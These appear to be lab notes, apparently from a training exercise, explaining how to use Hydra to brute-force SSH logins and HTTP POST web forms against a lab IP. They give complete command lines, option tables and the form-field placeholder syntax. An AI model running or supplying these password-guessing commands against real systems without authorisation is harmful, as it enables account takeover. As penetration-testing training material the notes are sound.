### SSH

```hydra -l <username> -P <full path to pass> 10.10.243.107 -t 4 ssh```

|Option | Description
|:-|:-
|-l | specifies the (SSH) username for login
|-P | indicates a list of passwords
|-t | sets the number of threads to spawn

### Post Web Form

We can use Hydra to brute force web forms too. You must know which type of request it is making; GET or POST methods are commonly used. You can use your browserâ€™s network tab (in developer tools) to see the request types or view the source code.

```sudo hydra <username> <wordlist> 10.10.243.107 http-post-form "<path>:<login_credentials>:<invalid_response>"```

|Option | Description
|:-|:-
|-l | the username for (web form) login
|-P | the password list to use
|http-post-form | the type of the form is POST
|<path> | the login page URL, for example, login.php
|<login_credentials> | the username and password used to log in, for example, username=^USER^&password=^PASS^
|<invalid_response> | part of the response when the login fails
|-V | verbose output for every attempt

```hydra -l <username> -P <wordlist> 10.10.243.107 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V```

* The login page is only /, i.e., the main IP address.
* The username is the form field where the username is entered
* The specified username(s) will replace ^USER^
* The password is the form field where the password is entered
* The provided passwords will be replacing ^PASS^
* Finally, F=incorrect is a string that appears in the server reply when the login fails
